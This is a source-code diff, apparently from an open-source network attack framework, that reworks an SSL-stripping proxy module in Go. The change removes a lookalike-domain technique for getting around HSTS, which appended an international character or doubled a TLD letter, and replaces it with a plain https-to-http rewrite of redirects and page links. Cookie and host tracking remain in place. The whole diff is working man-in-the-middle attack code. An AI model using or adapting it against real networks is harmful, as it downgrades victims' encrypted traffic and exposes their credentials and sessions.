@@ -30,7 +30,6 @@ var (
 
 type SSLStripper struct {
 	enabled       bool
-	useIDN        bool
 	session       *session.Session
 	cookies       *CookieTracker
 	hosts         *HostTracker
@@ -38,16 +37,15 @@ type SSLStripper struct {
 	pktSourceChan chan gopacket.Packet
 }
 
-func NewSSLStripper(s *session.Session, enabled bool, useIDN bool) *SSLStripper {
+func NewSSLStripper(s *session.Session, enabled bool) *SSLStripper {
 	strip := &SSLStripper{
 		enabled: false,
-		useIDN: false,
 		cookies: NewCookieTracker(),
 		hosts:   NewHostTracker(),
 		session: s,
 		handle:  nil,
 	}
-	strip.Enable(enabled, useIDN)
+	strip.Enable(enabled)
 	return strip
 }
 
@@ -79,9 +77,8 @@ func (s *SSLStripper) onPacket(pkt gopacket.Packet) {
 	}
 }
 
-func (s *SSLStripper) Enable(enabled bool, useIDN bool) {
+func (s *SSLStripper) Enable(enabled bool) {
 	s.enabled = enabled
-	s.useIDN = useIDN
 
 	if enabled && s.handle == nil {
 		var err error
@@ -127,32 +124,8 @@ func (s *SSLStripper) isContentStrippable(res *http.Response) bool {
 	return false
 }
 
-func (s *SSLStripper) processURL(url string) string {
-	// first we remove the https schema
-	url = url[8:]
-
-	// search the first instance of "/"
-	iEndHost := strings.Index(url, "/")
-	if iEndHost == -1 {
-			iEndHost = len(url)
-	}
-	// search if port is specified
-	iPort := strings.Index(url[:iEndHost], ":")
-	if iPort == -1 {
-			iPort = iEndHost
-	}
-	if s.useIDN {
-		// add an international character to the domain name & strip HTTPS port (if any)
-		url = url[:iPort] + "ノ" + url[iEndHost:]
-	} else {
-		// double the last TLD's character & strip HTTPS port (if any)
-		url = url[:iPort] + string(url[iPort-1]) + url[iEndHost:]
-	}
-
-	// finally we add the http schema
-	url = "http://" + url
-
-	return url
+func (s *SSLStripper) stripURL(url string) string {
+	return strings.Replace(url, "https://", "http://", 1)
 }
 
 // sslstrip preprocessing, takes care of:
@@ -253,7 +226,7 @@ func (s *SSLStripper) Process(res *http.Response, ctx *goproxy.ProxyCtx) {
 				log.Info("[%s] Got redirection from HTTP to HTTPS: %s -> %s", tui.Green("sslstrip"), tui.Yellow("http://"+origHost), tui.Bold("https://"+newHost))
 
 				// strip the URL down to an alternative HTTP version and save it to an ASCII Internationalized Domain Name
-				strippedURL := s.processURL(newURL)
+				strippedURL := s.stripURL(newURL)
 				parsed, _ := url.Parse(strippedURL)
 				hostStripped := parsed.Hostname()
 				hostStripped, _ = idna.ToASCII(hostStripped)
@@ -280,7 +253,7 @@ func (s *SSLStripper) Process(res *http.Response, ctx *goproxy.ProxyCtx) {
 			// make sure we only strip valid URLs
 			if parsed, _ := url.Parse(u); parsed != nil {
 				// strip the URL down to an alternative HTTP version
-				urls[u] = s.processURL(u)
+				urls[u] = s.stripURL(u)
 			}
 		}
 
